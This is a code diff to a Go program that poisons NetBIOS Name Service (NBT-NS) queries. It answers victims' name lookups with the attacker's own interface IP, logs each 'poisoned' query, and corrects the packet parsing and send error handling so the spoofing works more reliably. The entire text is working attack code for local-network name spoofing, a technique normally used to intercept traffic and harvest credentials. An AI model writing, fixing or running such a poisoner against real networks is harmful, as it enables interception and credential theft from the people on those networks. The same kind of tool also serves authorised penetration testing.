@@ -48,8 +48,11 @@ func PoisonNBTNS(ifaceIP net.IP) {
 		}
 		resp := BuildNBTNSResponse(pkt, ifaceIP)
 		if resp != nil {
-			conn.WriteTo(resp, src)
-			core.LogInfo("[NBT-NS] Poisoned query for '%s' - responding with %s", name, ifaceIP)
+			if _, err := conn.WriteTo(resp, src); err != nil {
+				core.LogError("[NBT-NS] send to %s FAILED: %v", src, err)
+			} else {
+				core.LogInfo("[NBT-NS] Poisoned query for '%s' - responding with %s", name, ifaceIP)
+			}
 		}
 	}
 }
@@ -115,10 +118,11 @@ func BuildNBTNSResponse(query []byte, ip net.IP) []byte {
 		return nil
 	}
 	labelLen := int(query[12])
-	if labelLen != 32 || len(query) < 13+32+4 {
+	if labelLen != 32 || len(query) < 12+1+32+1 {
 		return nil
 	}
-	encodedName := query[12 : 13+32+1]
+
+	encodedName := query[12 : 12+1+32]
 
 	var resp []byte
 	resp = append(resp, byte(txID>>8), byte(txID))
